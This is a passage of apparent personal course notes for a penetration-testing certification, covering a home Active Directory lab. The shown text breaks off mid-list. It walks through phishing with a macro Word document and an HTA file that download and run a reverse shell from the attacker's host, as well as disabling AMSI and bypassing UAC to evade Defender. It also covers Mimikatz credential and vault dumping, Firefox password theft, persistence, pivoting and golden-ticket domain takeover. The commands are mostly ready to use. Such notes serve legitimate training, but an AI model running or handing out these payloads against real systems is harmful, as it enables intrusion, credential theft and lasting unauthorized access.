---
title: "6 - Movement, Pivoting and Persistence"
classes: single
header:  
  teaser: /assets/images/posts/pnpt/pnpt-teaser5.jpg
  overlay_image: /assets/images/main/header4.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Lateral Movement, Pivoting and Persistence using the C2 Covenant and Metasploit"
description: "Lateral Movement, Pivoting and Persistence using the C2 Covenant and Metasploit"
categories:
  - notes
  - pnpt
tags:
  - beginner
  - pentest
  - pivot
  - c2
  - AD
toc: true
---

> [INFO] Even though this course is not necessary to pass the PNPT exam, I'm adding it here anyway.

**Resources**:

Mayor Notes: https://themayor.notion.site/themayor/Pentesting-Notes-9c46a29fdead4d1880c70bfafa8d453a

git: https://github.com/dievus/adgenerator

Share: https://mayorsec-my.sharepoint.com/personal/joe_mayorsec_com/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fjoe%5Fmayorsec%5Fcom%2FDocuments%2FCourse%20Share%20Drive

MayorSec discord: https://discord.gg/AWx2SxCD69

# Lab Setup


## Virtual Box Config
```
File > preferences > Network > add new

External: 192.168.3.0/24
Internal: 192.168.16.0/24
Secure: 10.120.116.0/24
```

### UbuntuMail
```
Settings > Network > NatNetwork: External
```

### Windows 10x64 Enterprise - Workstation 1
```
Network > 
Adapter1 > Natnetwork: External
Adapter2 > Natnetwork: Internal
Adapter3 > Natnetwork: Secure
```

### Windows Server 2019
```
DC01
Natnetwork: Secure
Password123!
```

## Machines Config

### DC config
https://github.com/dievus/adgenerator

> grab the files of this git


Powershell:
```powershell
Set-ExecutionPolicy Unrestricted > Y
. .\Invoke-ForestDeploy.ps1 > R
Invoke-ForestDeploy -DomainName mayorsec.local
set a password
restart
```


- log using mayorsec\<user>

Powershell:
```powershell
. .\ADGenerator.ps1 > R
Invoke-ADGenerator -DomainName mayorsec.local
```

```
Network Adapter > properties > ipv4:
10.120.116.75
255.255.255.0
10.120.116.1
127.0.0.1
8.8.8.8
```

### Workstation 1 - WIndows 10x64
```
Settings > 2cpus
20gb hd - 2gb ram
storage disk file : iso
network: 3 adpters = nat network
- external
- internal
- secure

s.chisholm:FallOutBoy1!
```

```
Network Adapter (modify the secure network - the 10.* range)> properties > ipv4: 
	10.120.116.10
	255.255.255.0
	10.120.116.1
	10.120.116.75
	8.8.8.8
```

```
Access Work or School > connect > Join this device AD domain > mayorsec.local
s.chisholm:FallOutBoy1! > Administrator > restart
```

```
\\10.120.116.75\Shared\ADGenerator > copy nameGen to desktop
open Powershell as administrator > Set-ExecutionPolicy Unrestricted > Y

  . .\nameGen.ps1
  executeScript -ComputerName WORKSTATION-01

restart > log in and restart again to load the GPO config

edit C:\Windows\System32\drivers\etc\hosts
  <ubuntuMail IP> mail.mayorsec.com
```


### Workstation 2 - windows10x64
```
Settings > 2cpus
20gb hd - 2gb ram
storage disk file : iso
network: 2 adpters = nat network
	internal
	secure

m.seitz:Phi11i35@44
```

```
Network Adapter (modify the secure network - the 10.* range)> properties > ipv4: 
10.120.116.20
255.255.255.0
10.120.116.1
10.120.116.75
8.8.8.8
```

```
Access Work or School > connect > Join this device AD domain > mayorsec.local
m.seitz:Phi11i35@44 > Administrator > restart

\\10.120.116.75\Shared\ADGenerator > copy nameGen to desktop
open Powershell as administrator > Set-ExecutionPolicy Unrestricted > Y

. .\nameGen.ps1
executeScript -ComputerName WORKSTATION-02

restart > log in and restart again to load the GPO config

edit C:\Windows\System32\drivers\etc\hosts
  <ubuntuMail IP> mail.mayorsec.com
```

### UbuntuMail
```
cpu 1
ram 2gb
Settings > Network > Nat Network> external

login as > studentuser:Password123!
ip: 192.168.3.4
gateway: 192.168.3.1
dns: 8.8.8.8

edit /etc/hosts
  127.0.0.1 mail.mayorsec.com mayorsec.com
  <ubuntuMail ip> mail.mayorsec.com mayorsec.com
```

in Kali:
edit /etc/hosts
```
<ubuntuMail ip> mail.mayorsec.com mayorsec.com
```


In Workstation 1:
```
open in the browser the ubuntuMail : 192.168.3.4 (or whatever the ip is)
this should open a Roundcube Webmail
```

Optional:
```
A Kali Linux Distro is available For the course. 
Just make sure the network config is set to 'NAT Network: External'
https://1drv.ms/f/s!AlDxd4Hr_BuOrxTds39VMqiV5VjK
```



## Lab Config

### DC01
10.120.116.75

### W01
s.chisholm - FallOutBoy1!
10.120.116.10

### W02
m.seitz - Phi11i35@44
10.120.116.20

### Mail
192.168.3.5

# Introduction to Command and Control (C2)

- C2 is the combination of techniques and tools used by Pentesters and ethical hackers to persist and communicate in a target environment

Tools:
	
	Covenant - https://github.com/cobbr/Covenant
	
	Metasploit - https://github.com/rapid7/metasploit-framework




## Introduction to Covenant
```powershell
cd /opt/Covenant/Covenant
dotnet run

studentuser:Password123!
```

Grunts = user sessions

```powershell
# In Launchers > Host > 

# we can search For a rev shell, this will encode our command
# we send to the target windows to grab our revshell and execute it.

example command:
powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/<revshell.ps1')"

# Data > Credentials = this functionality will save the credentials we found a long the way
```

|Session| Id| Value|
|0 | >0| |
| medium | local | user |
| high | local| admin|
| system 0 | domain | admin|
| system >0  | DC | system admin|



# Gaining the Foothold

	https://mayosec.github.io/MayorSecSecuritySolutions/



## Enum
- Write down names/usernames 
- we can run **namemash.py** to transform all gathered names into possible usernames

```python
python3 namemash.py <names-file.txt>
```

Run owasp ZAP:
```powershell
attack > fuzz = intruder of burp
here we can add username/password as variables and try password spraying/credential stuffing
```



## Phishing DOC
write an email with that access
```
go to github > nishang Out-Word.ps1 
# this will put a malicious macro in your word file
save the exploit: notepad > OutWord.ps1
```


Create a listener in Convenant:
```
Listeners > httpListener: 
name: HTTP Listener
ConnectAddresses: <kali ip>
ConnectPort: 80 (or another if u want)
Save
```

```
# Go to Lauchers > Powershell > Generate > Listener: HTTP Listener
DotNetVersion: Net40
KillDate: something in the future
Generate
# Lauchers > Host > url: rev,ps1 > host
copy the encoded payload
```


Go to Workstation-01: where the phishing is happening:
```
powershell > import OutWord.ps1 = . .\OutWord.ps1
run the file > OutWord.ps1 -Payload "paste the encoded payload" -OutputFile Something.doc
now we gotta send the something.doc to the kali machine
```


in Kali:
```
smbserver.py Share . -smb2support
```

Workstation-01:
```
just drag the file to the share folder
```

> When the word file is open - enable content
it will generate a *GruntHTTP*, that means a session in our Convenant


Host the malicious file:
```
Convenant > Listeners > Hosted Files > Create > Select the file > Create
localhost/file.doc : if its openning to save the file, then is correct
```

Going on with the phishing:
```
add a link in the email redirecting to the Kali IP/file.doc > send it
everyone that opens that, will generate a shell in our Convenant
```

# Phishing with HTA / HTML

```bash
mkdir file.hta
<script language="VBScript">
Function DoStuff()
  Dim wsh
    Set wsh = CreateObject("Wscript.shell")
    wsh.run "<powershell command here>"
    Set wsh = Nothing
End Function

DoStuff
self.close
</script>
```

```
copy the payload to the "powershell command here" area.
host the file in Convenant
  Convenant > Listeners > Hosted Files > Create > Select the file > Create
  localhost/file.hta : if its openning to save the file, then is correct
```

# Phishing with Metasploit
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> -f hta-psh -o file.hta
use multi/handler > set options

python3 -m http.server 80
```

make sure the link inside the email, is poiting to our kali ip/file.hta
when the file is opened - we should get a meterpreter shell

> everything works the same, but we are hosting the file via python web server and our listener is meterpreter




## Password Spraying Finding

Description:
```
ABC Organization enables poor password policies in the Roundcube e-mail service which allowed For Account compromise via password spraying.
```

Remediation:
```
Require the use of strong password on the Roundcube email server.
Refer to organizational password policies \for guidance and to ensure policies meet industry best practices.
```

### Email Phishing Finding

Description:
```
ABC Organization allowed the compromise of user workstation in the MayorSec domain through succesful e-mail phishing emails. Emails bypassed AV restrictions due to user disabling services.
```

Remediation:
```
Conduct training no less than two times a year that includes identification of suspicious emails, links and attachments.
Generate a domain-wide Group Policy Object that prevents local users from disabling anti-virus on devices.
```

# Enumeration the Local Machine, Privilege Escalation and Local Persistence

## Local Enumeration

### With Covenant
in the Covenant shell:
```powershell
seatbelt -group=all

GetDomainUser
GetNetLoggedOnUser
GetNetLocalGroup
LocalUsers
GetDomainComputer
```

### With Metasploit
in meterpreter shell:
```powershell
sysinfo
getuid
ipconfig
arp
netstat -ano
run post/windows/gather/enum_services
run post/windows/gather/enum_applications
run post/windows/gather/enum_domains
route
```



## AutoLogon Misconfiguration and Exploitation

### Workstation-01
```bash
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\AutoAdminLogon > set 1

New > String Value > DefaultUserName > set s.chisholm
New > String Value > DefaultPassword > set FallOutBoy1!
New > String Value > DefaultDomainName > set mayorsec
restart the machine
```

### Covenant
```bash
Create a listener with there is not one
Launcher > Powershell > set options > copy the payload
```

### Workstation-01
```powershell
powershell -Sta -Nop -Window Hidden -EncodedCommand "payload from covenant"
this will generate a shell in covenant
```

### In Covenant Shell
```powershell
PowerShellImport > browse > PowerUp.ps1
powershell Invoke-AllChecks
Seatbelt WindowsAutoLogon
SharpUp audit
```


## AlwaysInstallElevated Misconfiguration and Exploitation

Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
```
> set AlwaysInstallElevated to 1
```

Computer\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\
```
> New > Key > Installer > New > Key > DWORD (32-bit) Value > AlwaysInstallElevated
set AlwaysInstallElevated to 1
```

### In Covenant Shell:
```powershell
sharpup audit
PowerShellImport > browse > PowerUp.ps1
powershell Invoke-AllChecks
```

> Here we are looking for **AlwaysInstallElevated** Registry Keys - HKLM | HKCU
This vulnerability give us privilege escalation opportunity.

> [*] Checking for **AlwaysInstallElevated** registry key...
AbuseFunction : Write-UserAddMSI

```bash
msfvenom -p windows/exec CMD="revshell payload from covenant" -f msi -o installer.msi
```

In Covenant Shell:
```
upload C:\Users\Public\installer.msi > browse > grab the installer.msi
ChangeDirectory C:\Users\Public
ls = to verify if your payload is here
shell msiexec /quiet /qn /i installer.msi
this should give us an elevated revshell with authority\system access
```

### with Metasploit:
```bash
# we can get a shell with:
multi/script/web_delivery

# in meterpreter shell session:
getuid
run post/multi/recon/local_exploit_suggester
ctrl+z = to background the session
use exploit/windows/local/always_install_elevated
set options
exploit = ( -j to run in the background if u want)
we get a authority\system shell
ps = to show processes
```

> we can migrate to a SessionID that has 1 as value & is from authority\system = so we get more privileges
usually winlogon.exe. Grab the PID of this process

```powershell
migrate <PID>
sysinfo
```

> now we have a better shell



## FodHelper UAC Bypass with Covenant

FodHelper is a trusted WIndows binary, that u can use to bypass UAC
we are going from local user to local administrator

```
PowerShellImport > browse > helper.ps1
powershell helper -custom "cmd.exe /c <revshell payload from covenant>"
local user to local administrator shell

# Launcher > ShellCode > Net40 > Generate > Download > save the file
```

### Covenant
```
Inject > ProcessID ( PID of a SessionId >0 that has system access, usually winlogon.exe )
browse > select our shellcode file
# we should get authority\system access
```

#### [+] Extra Info
So the level Integrity of the escalation went:
```
Medium: local user
High: local admistrator
System: authority\system 
```


### With Meterpreter
Get an initial shell:
```bash
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac_dotnet_profiler
set options
exploit -j
```

Go to the new session:

> we are **local admin** , lets escalate even more

```bash
ps = to show processes
```

lets migrate to a process that has:
```
# SessionID=1 & authority\system access
migrate <PID> 
# again, usually winlogon.exe its a good choice
```

#### [+] 

> You may not always get a machine that has SessionID=1 processes.

> Keep in mind that perhaps you need to generate a new user, grant him administrator back access in the local machine. 

> And then you might need to log with that user to get SessionId=1



## Persistence

### New User Persistence
in Covenant:
```bash
if u have local admin access (high integrity) 
shellcmd net users <newuser> <password> /add
shell net users = to see if our user was created
shell net localgroup administrators <newuser> /add
```

### StartUp Persistence
In Covenant:
```bash
# we will need a local admin (high integrity) access too
Launcher > powershell > revshell > copy the encoded payload
Grunts > click in the session > Task > PersistStartup > paste de payload > name and click Task
```

> This will send the malicious file to the startup directory in the Windows targert machine
it will give us shell back, even after restart


To clean:
```
Just delete the file from startup directory
```

### Autorun Persistence
In Covenant:
```bash
# we will net a local admin (high integrity) access
Launcher > binary > Net40 > generate & Download > save the file
Grunts > click in the high session > Task > PersistAutorun > copy the value path > 
open a new tab > click in the shell of the high session > upload > paste the value path > select the file
now go back to the first tab and click Task to finish
```

> if u want to see the process in the target machine: 
go to register > HKCU\Software\Microsoft\windows\CurrentVersion\Run

OR

in covenant shell:
```
	GetRegistryKey HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# this will show the register in the machine
```

> After restarting the target windows machine
we should get a shell back in Covenant

To clean:
```
delete the register
delete the autorun file in C:\Users\Public\autorun
```

### Persistence via RDP
```
Workstation-01 > Remote Desktop Settings = off

in Covenant shell:
powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

> This command enables Remote Desktop.

In Kali:
```
xfreerdp /u:<user> /p:'password' /v:<target ip>
```

#### [+] Disable the firewall

The RDP persistence is very valuable, because it give us a GUI. So its easy to look.

In case you want disable the firewall rule, its the same command but change the 
```
{/d 0 -> /d 1} and {Enable-NetFirewallRule -> Disable-NetFirewallRule}
```

Disable the firewall rule:
```powershell
powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

## Port Forward

### Session Passing to Metasploit

> if we have a session in covenant of any integrity and need to use port forwarding, autoroute etc
we can pass the session to the metasploit, because covenant does not have that functionality


msfconsole:
```
search web_delivery
use exploit/multi/script/web_delivery
set target 2 = powershell
set payload windows/x64/meterpreter/reverse_http 
set others options
exploit -j
copy the payload
```

> the **reverse_http** its better than **reverse_tcp** to evade detection


Go to Covenant Shell:
```powershell
powershell <paste the payload>
# this will give a session to metasploit
```

### Routing Functions 
In meterpreter session:
```
ipconfig # to see which route we wanna open
run autoroute -s <192.168.16.0/24>
run autoroute -p # to check the routes
```

### Port Forwarding

> The Traffic sent from inside the network that we dont have access, can be forward to a device that we do have access back to our kali machine.


In meterpreter session:
```bash
portfwd add -R -p 1234 -l 443 -L <kali ip>

# -R = reverse
# -p = port of target machine, doest not matter
# -l = port in our kali
# -L = listening host = kali ip

portfwd  # to show the total active port forwards
ctrl + z # background the session 
```

### SOCKS
```bash
search socks
use auxiliary/server/socks4a
cat /etc/proxychains4.conf > copy the port in the socks4 line
example: socks4 127.0.0.1 9050
set the port we check in proxychains4
exploit -j

jobs
jobs -k <number> = if u want to kill 

portfwd # pay attention to the info
example : <kali ip>:443   0.0.0.0:1234

# Go to covenant & create a listener to interact with that port forward
Listeners > name=Reverse HTTP > BindPort=443 > ConnectPort=1234 > ConnectAddresses=target ip
Create
```

> To visualize: go to msfconsole > netstat -ano
there is a service 0.0.0.0:1234 LISTEN powershell.exe
that service will capture the traffic and push off over to our kali machine

```bash
Launchers > powershell > reverse http > Net40 > Generate
Host > /rev.ps1 > click host > copy the encoded payload
```

#### POC
```
- Go to workstation-02, that we do not have directly access.
- disable AV 
- paste the payload, we should get a session in Covenant
```

> If u try to generate again without port forward this will not work

```
Launchers > Generate HTTP Listener > Host > rev.ps1 - host > copy encoded payload 
try to execute in the workstation-02
```


### ProxyChains
```bash
proxychains evil-winrm -u <user> -p 'password' -i <ip of workstation-02>

# we get a shell
# without the portfwd in the meterpreter, this will not work 
```



## Workstation Dominance

### Dumping Hashes
You need a high integrity Covenant Shell
if you are not authority\system we need to run token::elevate 

**Mimikatz in Covenant Shell**:
```bash
Mimikatz token::elevate lsadump::secrets
```

> Here we are looking for plain text credentials


```bash
Mimikatz token::elevate lsadump::sam
```

> Here we want hashes
Covenant store the hashes we found in Data - Credentials


**Metasploit**:
```bash
run post/windows/gather/win_privs
getsystem
getuid

# if u are authority\system:
hashdump > grab to crack later
load kiwi # to use mimikatz in meterpreter
help # to see available commands

creds_all
lsa_dump_sam
lsa_dump_secrets
```



### Cracking Credentials

**Hashcat**:
```bash
hashcat.exe -a 0 -m 1000 <hash> -r <rule file> <wordlist>

# -m 1000 = NTLM
```

→ https://hashcat.net/wiki/doku.php?id=example_hashes

→ https://github.com/NotSoSecure/password_cracking_rules

**Cracking Vault with Covenant**:

First enable RDP in DC.

in Workstation-01:
```bash
Control Panel\User Accounts\Credential Manager
```

> If someone log in the DC For example, the credential will be stored in the credential manager.
We cant see the password, but its stored there... What that means? means that we can get.

In Covenant Shell:
Workstation-01 - medium integrity:
```bash
mimikatz vault::cred
```

To find where the credentials are:
```bash
ls c:\users\<user.domain>\appdata\local\microsoft\credentials
grab the full path
```

Open another Covenant Shell in a new tab:
```bash
Grunts > shell > Task > Mimikatz > "dpapi::cred /in:<paste full path from credentials>" > Task
grab the guidMasterKey
```

```bash
ls C:\users\<user.domain>\appdata\roaming\microsoft\protect
# then ls the full path result
# this should show the guidMasterKey > copy the full path & compare with the guidMasterKey from before

Grunts > shell > Task > Mimikatz > "dpapi::masterkey /in:<full path of guidMasterKey> /rpc" > Task

# rpc = remote procedure call
# in the end of the output we should find the key value of DC > copy & save the key

# Go back to Task > "dpapi::cred /in:<full path of credentials> /masterkey:<key value>" > Task
```


> This will dump the plain text password of the account that was stored in Credential Manager
In this case, its the DC.



**Cracking Vault via Metasploit**

in meterpreter shell:
```bash
upload <mimikatz.exe> C:\\Users\\Public\\mimikatz.exe
shell
cd c:\users\public

dir /a C:\users\<user.domain>\appdata\local\microsoft\credentials
# it should show the key path

mimikatz.exe
vault::cred

dpapi::cred /in:<credential path>\<key path>
# it should show the guidMasterKey
exit (mimikatz)

dir /a C:\users\<user.domain>\appdata\roaming\microsoft\protect
dir /a C:\users\<user.domain>\appdata\roaming\microsoft\protect\<SID directory>
grab the guidMasterKey

mimikatz.exe
dpapi::masterkey /in:<full path of guidMasterKey> /rpc
# it should show the master key value that we need to crack

dpapi::cred /in:<full path of credentials> /masterkey:<key value>
# it dumps the password
```

#### [+] 101


It looks complicated but its not.

There is 4 steps:
```bash
1. Get the key path:
run dir in appdata\local\microsoft\credentials

2. Get the guidMasterKey full path:
its in appdata\roaming\microsoft\protect\<SID>
we just need to find the SID directory running DIR 

3. Discover the key value:
mimikatz.exe
dpapi::masterkey /in:<full path of guidMasterKey> /rpc

4. Crack the key value:
dpapi::cred /in:<full path of credentials> /masterkey:<key value>
```


### Dumping Firefox Credentials
workstation-01 - first open firefox and save a credential of any site

#### Metasploit
background your session

search firefox:
```bash
use post/multi/gather/firefox_creds
set session
exploit -j
```

> it will save the firefox credentials dump in /root/.msf4/loot/

We need to rename the dump files:
```bash
cert > cert9.db
key4 > key4.db
logi > logins.json
cook > cookies.sqlite

sign > signons.sqlite # optional
```

```
/opt/ git clone https://github.com/unode/firefox_decrypt
./firefox_decrypt.py /root/.msf4/loot/
# it will dump all the credentials saved in FIrefox
```

To check if firefox is in the machine and u may wanna try this exploit

in meterpreter session:
```bash
run post/windows/gather/enum_applications
```



## Bypassing Defender with FodHelper
```
- Go to workstation-01
- Enable all protection except Automatic sample Submission
```

Disable AMSI and Gain reverse shell:
```
AMSI = anti malware scanning interface from windows
```

> we are gonna use FodHelper to break it.

Covenant:
```
- make sure ip address is correct and you paste the revshell payload from covenant
- We need to host a file (in this case banana.txt) in covenant
```

**banana.txt content**:
```
iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/helper.ps1');helper -custom "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse; cmd.exe /c <powershell reverse shell>"
```

**Benefits.doc - Macro Word File**:
```macro
Sub FruitLoops()
  Dim wsh As Object
  Set wsh = CreateObject("WScript.Shell")
  wsh.Run "powershell iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/banana.txt')"
  Set wsh = Nothing
End Sub
Sub AutoOpen()
  FruitLoops
End Sub
```

We need to host 2 files - the exploit and the helper.ps1:
```bash
Listener > host > /banana.txt > browser > select file > create
Listener > host > /helper.ps1 > browser > select file > create
```

in Workstation-01:
```powershell
iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/banana.txt')
```

> Windows defender will not get our exploit, cause we bypassed
we should get high integrity shell in Covenant


in Covenant Shell:
```bash
whoami
Mimikatz token::elevate lsadump:sam
```

```
Go back to workstation-01 > rename back to the original file
 > register > HKLM\software\microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

- c:\Shared\Benefits.doc = the malicious macro file

> it will change de register file again. and we will gain shell from covenant again

# Domain Enumeration

## Downloading Files

- With Powershell

In Covenant:
```bash
Listeners > Hosted Files > Create > /powerview.ps1 > browser > select PowerView.ps1 > Create
```

Download the hosted File:
```powershell
certutil.exe -urlcache -f http://<kali ip>/powerview.ps1 powerview.ps1
wget http://<kali ip>/powerview.ps1 -OutFile powerview.ps1
iex (New-Object Net.WebClient).DownloadString('http://<kali ip>/powerview.ps1');get-netcomputer
```

> iex does not download the file, however it loads into memory. 
so we can execute commands of powerview in this case.



## Enumerating Users
First download powerview.ps1:
```powershell
get-netuser
get-netuser | select cn
get-netuser | select -expandproperty samaccountname
find-userfield -SearchField description "password"
```

Enumeration Local Admin Users:
```powershell
Invoke-EnumerateLocalAdmin
```


## Enumerating Groups
**powerview.ps1**:
```powershell
get-netgroup
get-netgroup -UserName "<user>"
get-netgroup -GroupName "<group>" -FullData
```

## Enumerating Domain Computers
**powerview.ps1**:
```powershell
get-netcomputer
get-netcomputer -Full-Data
get-NetComputer -OperatingSystem "*Windows 10"
get-NetComputer -OperatingSystem "*server" 
```

**Shares**:
```powershell
Invoke-ShareFinder
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```
**Files**:
```powershell
Invoke-FileFinder
```

## Enum GPO / ACL

Enumerating Group Policy Objects (GPO):
```powershell
get-netgpo
```

Enumerating Access Control Lists (ACL):
```powershell
get-objectacl
get-objectacl -SamAccountName "engineering" -ResolveGUIDs
net group sales /domain
net group <group> /domain
net users <user> /domain

net group <group> <user you wanna delete from the group> /del /domain
net group <group> <user you wanna add in the group> /add /domain
```

> If we can add another user to some group, we can add ourselves to a group to gain access to files/directories


Enumerating the Domain:
```powershell
get-netdomain
get-domainpolicy
get-domainsid
```



## Powershell Remoting

Login another machine remotely:
```powershell
Enter-PSSession -ComputerName workstation-02 -Credential <domain\user>
```

Executing a command remotely:
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <pc> -Credential <domain\user>
```


# Movement, Pivoting and Persistence in the Domain

## Necessary Domain Misconfigurations
```bash
in DC > folders > delegate control > add IT admin group > check all delegations.

GPO manager > computer > Policies > Administrative Templates > System > Credential Delegation
Restrict delegation of credentials to remote server > disabled
```

## Overview Bloodhound

> Bloohound is a good tool to show us a visual landscape of the domain network.
it shows the hierarchy connection between nodes until the domain controller


in Covenant shell ( medium integrity ):
```powershell
ChangeDirectory C:\Users\Public
upload > path=C:\users\public\sharphound.exe > browse > select SharpHound.exe
```

### Bloodhound
In Covenant:
```powershell
shell sharphound.exe -c all = this will capture all domain objects
sharphound saves into a zip file, go ahead and copy the file name
download <bloodhound.zip>
click in the file inside covenant > save file
```

in kali:
```powershell
apt install bloodhound neo4j
neo4j console
go to localhost:7474 and change de password [ default > neo4j:neo4j ]
bloodhound
```

In BloodHound:
```powershell
drag and drop the bloodhound.zip that we got earlier
Database info
Analysis > Find all domain Admins
Analysis > Find Shortest Paths to Domain Admins > click in connection GenericAll > help > abuse info
```


## Abusing ACLs
upload powerview_dev,ps1 to the target windows machine


load **powerview_dev**
```powershell
. .\powerview_dev.ps1
net user <user1> /domain
net group engineering <user1> /add /domain = we are adding our user to another group, to gain more access
net group "IT ADMINS" <user1> /add /domain = gaining more access
```

> How to know which group to add ourselves?
with bloodhound, it shows which group has **genericAll access**, that allow us to move laterally within groups until there is another set of vulnerabilities we can exploit


Now that we have more access, we are gonna force a password change by another user:
```powershell
$SecPassword = ConvertTo-SecureString 'password of user1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('domain\user1', $SecPassword)
$UserPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <user2> -AccountPassword $UserPass -Credential $cred

net user <user2> /domain
# I can see that user2 is a member of Administrator, he has WriteDacl rights to DC

Enter-PSSession -ComputerName dc01 -Credential <domain\user2>
# We just opened a session in DC with the new credentials we created by force of user2
```

In this new Covenant DC01 session:
```powershell
net group "Domain admins" <user2> /add /domain
net user <user2> /domain
```

> We are part of domain admins group in the DC


## Pivoting through Remote Desktop via Compromised Host
Create a local account For <user2> first, grant local admin privileges, and then log in as **user2** locally. This will simulate the user as a help desk/technician logging in to service the machine and the hash being cached


**Log as user2 in workstation-01**:
```powershell
> logout > log as user1

open powershell as administrator > send revshell to Covenant listener 
# because we need high integrity shell
```

**in Covenant shell**:
```powershell
mimikatz token::elevate lsadump::sam
grab the hashes from user2
crack the hashes > john hashes.txt --format=nt -w=/rockyou.txt

Now that we have the password of user2
we can pivot from 'user1-workstation-01' to 'user2-workstation-02'
# we can log in user1 and RDP to user2 For example
```

> Now that we are inside workstation-02 using user2
we can pivot to DC01 using user2 because he has access; we can see that in Bloodhound



## Configuring Reverse Port Forward
```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<kali ip> lport=25 -f raw -o msf.bin
```

**In Metasploit**:
```powershell
use exploit/multi/handler
set options
exploit -j
```

**In Covenant**:
```powershell
Launchers > powershell > net40 > HTTP Listener > copy the encoded payload
Grunts > high integrity shell > ps
find a process that has SessionID>0, doesnt need to be authority\system
inject <PID> > browser > msf.bin

# a wild session appears in msf
```


Meaning behind that:

> we have covenant session, but we found another network and want to portfwd to enum these networks.
So we will pass the session to meterpreter via covenant, we dont have GUI access here.
In meterpreter session we can run autoroute, portfwd and SOCKS.



**In Meterpreter session**:
```powershell
ipconfig
run autoroute -s <target network/24> 
```

> the target network is one that we dont have access and we need this portfwd to gain that

```powershell
run autoroute -p
portfwd add -R -p 2222 -l 443 -L <kali ip>
portfwd
background the session = ctrl+z

search socks
use auxiliary/server/socks4a
set srvport = the same as in /etc/proxychains4.conf
exploit -j
```

> Done, now we will generate traffic from this internal network to our kali.

```
workstation-02 > workstation-01 > kali
the traffic will pass through workstation-01 that we have directly access.
```


## Gaining a Shell on an Internal Workstation
**In Covenant**:
```powershell
Listeners > create > Reverse HTTP > BindPort=443(port we are listening) > ConnectPort=2222 > ConnectAddresses=<workstation-01 IP> > create

Launchers > powershell > Reverse HTTP > net40 > Generate
Host > /rev1.ps1 > Host > Copy encoded payload
```


**In Metasploit**:
```powershell
use exploit/windows/smb/psexec
set options # but we dont know the RHOSTS of worksation-02

# we can open the session of workstation-01 and ping workstation-02 to know the IP
set payload windows/x64/exec
set cmd <paste the payload of covenant here>
exploit -j
```

> we should gain a shell in the Covenant Listener
its SYSTEM integrity but SessionID=0
we can try to improve to a SessionID=1


## Remoting Through ProxyChains
**In Covenant system shell**:
```powershell
PowerShellRemotingCommand <computername> <"command"> <domain> <username> <password>
"command can be reverse http from listener"
# we should get a shell with high integrity and user2 access.
```

**in Kali**:
```powershell
proxychains xfreerdp /u:<user2> /p:'Password123!' /v:<workstation-02 IP> /d:<domain>
```

> In order to this process work: we need **socks proxy** set in metasploit, **autoroute** and **portfwd** too cause we are accessing a machine in another network.



- gain access to workstation-02
- we can go further and pivot to DC01 through Remote Desktop


## Unconstrained Delegation

> [Note] that the following command needs to be ran from an Administrator/elevated Powershell prompt on DC01 as well prior to doing this lesson

```powershell
Get-ADComputer -Identity Workstation-02 | Set-ADAccountControl -TrustedForDelegation $true
```

**Bloodhound**:
```powershell
analysis > shortest paths to unconstrained delagation systems
```

**In Covenant system/0 shell**:
```powershell
upload > C:\users\public\ms-rprn.exe > browser > select ms-rprn.exe > execute
ChangeDirectory C:\users\public
shell ms-rprn.exe \\TargetServer \\targetHost
PowerShellImport > PowerView_dev.ps1
Powershell get-netcomputer -unconstrained -properties dnshostname
# it shows the hostnames that have unconstrained delegation
```

```powershell
shell ms-rprn.exe \\DC01 \\workstation-02
rubeus dump /service:krbtgt
# copy the Base64EncodedTicket from DC01$ 
# take the spaces off

maketoken administrator <domain> <whateverForPassword>

# copy the kerberos ticket
rubeus ptt /ticket:<paste the ticket>

# Output: [+]  Ticket Successfully imported!
```

> This means this session is acting as domain controller, we have full domain rights

POC - Create a user and add him to Domain Admins group:
```powershell
shell net users /domain
shell net user <user3> 'password' /add /domain
shell net group "Domain Admins" <user3> /add /domain
shell net user user3 /domain
```

To dump the full SAM account of krbtgt:
```powershell
dcsync <domain\krbtgt>
```


## Golden TIcket Persistence
workstation-01 Covenant shell:
```powershell
# Upload > C:\users\public\
invoke-mimikatz.ps1
powerview.ps1
```

```powershell
cd C:\users\public
. .\powerview.ps1
get-domainsid
. .\invoke-mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:<domain> /sid:<get-domainsid output> /krbtgt:<kerberos ticket, maybe its saved in Covenant - Data> /ptt"'
# ptt = pass the ticket

```


At this point we are administrator of the DC - free access:
```powershell
ls \\dc01\c$
net group "domain admins" <user4> /add /domain
```



## Reverse Port Forwarding for Shell on DC01
Make sure WDefender are off

We need to have 3 listener **in Covenant**:
```powershell
1: HTTP Listener / ConnectAddress= kali ip / Port=80 
#External = its used to get workstation-01 access

2: Reverse HTTP / ConnectAddress= workstation-01 / port=2222 / bindport=443
# Internal - its used to get workstation-02 access through workstation-01 portfwd

